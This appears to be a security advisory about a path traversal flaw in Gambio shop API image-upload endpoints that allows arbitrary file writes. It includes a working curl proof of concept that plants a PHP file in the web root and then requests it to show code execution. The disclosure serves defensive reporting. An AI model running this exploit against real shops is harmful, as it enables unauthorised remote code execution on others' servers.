## Path traversal arbitrary file write in Gambio API image uploads

Modern API controllers forward user-supplied path segments directly into legacy filesystem writes without normalization.

- `GambioApi/Modules/ImageList/routes.php` exposes `POST /api.php/v3/image-lists/{imageListId}/images/{relativePath:.+}`.
- `GambioApi/Modules/ImageList/App/Actions/AddANewImageToAnImageListAction.php` builds `dirname(__DIR__, 5) . '/images/product_images/original_images/' . $relativePath` and writes request body via `file_put_contents` with no checks.
- `GambioApi/Modules/Option/App/Actions/AddANewImageToAnOptionValueAction.php` does the same for `POST /api.php/v3/options/{optionId}/values/{optionValueId}/image/{relativePath:.+}` targeting `images/product_images/option_images/`.

Because `{relativePath}` is captured with `.+` and never validated, an authenticated caller can traverse out of the intended folder and write arbitrary files in the web root (including `.php`), leading to RCE or overwriting application files.

### Proof of Concept

1. Upload a PHP file outside the image directory using path traversal:

```bash
curl -X POST \
  -H 'Authorization: Bearer <token>' \
  --data '<?php echo "pwned"; ?>' \
  http://<shop-host>/api.php/v3/image-lists/1/images/../../../../shell.php
```

This writes to `<web-root>/images/shell.php` (web-accessible).

2. Trigger the payload:

```bash
curl http://<shop-host>/images/shell.php
```

The response contains `pwned`, demonstrating arbitrary file write and code execution. The same attack works against the option image endpoint by targeting `/api.php/v3/options/1/values/1/image/../../../../shell.php`.

> Use this proof of concept only in fully authorized security testing.
